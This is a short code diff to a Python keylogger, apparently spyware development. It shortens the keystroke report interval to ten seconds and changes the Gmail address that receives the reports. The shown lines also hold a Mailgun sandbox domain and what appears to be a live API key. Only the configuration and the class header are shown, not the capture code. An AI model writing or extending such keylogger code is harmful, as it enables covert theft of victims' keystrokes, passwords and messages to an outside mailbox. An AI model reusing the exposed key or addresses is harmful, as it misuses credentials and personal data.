@@ -7,11 +7,11 @@ from threading import Timer
 from datetime import datetime
 
 
-SEND_REPORT_EVERY = 1800 # (in seconds)
+SEND_REPORT_EVERY = 10 # (in seconds)
 
 email = "sandboxfee7ec352d5f48b2a9aa467513e993b6.mailgun.org"
 key = "5e931e174fc18cf49534ea1d20eca163-e298dd8e-e53d83f1"  # Haal key veilig op
-recEmail = "hiowhat090@gmail.com"
+recEmail = "dani.duck702@gmail.com"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
